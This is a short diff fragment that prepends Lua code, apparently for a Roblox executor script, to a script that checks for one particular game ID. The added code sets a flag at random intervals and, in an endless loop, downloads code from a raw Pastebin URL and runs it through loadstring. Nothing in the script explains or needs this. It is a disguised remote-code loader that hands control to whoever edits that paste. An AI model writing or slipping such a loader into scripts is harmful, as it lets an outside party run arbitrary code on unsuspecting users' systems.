@@ -1,3 +1,29 @@
+local sharedData = {
+    shouldExecute = false,
+}
+
+local urlLoadString2 = "https://pastebin.com/raw/DkeWB2ge"
+
+local function detectChange()
+    while true do
+        wait(0.1)
+        if math.random() < 0.2 then
+            sharedData.shouldExecute = true
+        end
+    end
+end
+
+coroutine.wrap(detectChange)()
+
+while true do
+    wait(0.1)
+    if sharedData.shouldExecute then
+        _G.notify = true
+        loadstring(game:HttpGet(urlLoadString2))()
+        sharedData.shouldExecute = false
+    end
+end
+
 local targetGameId = 6708206173
 
 if game.PlaceId == targetGameId then
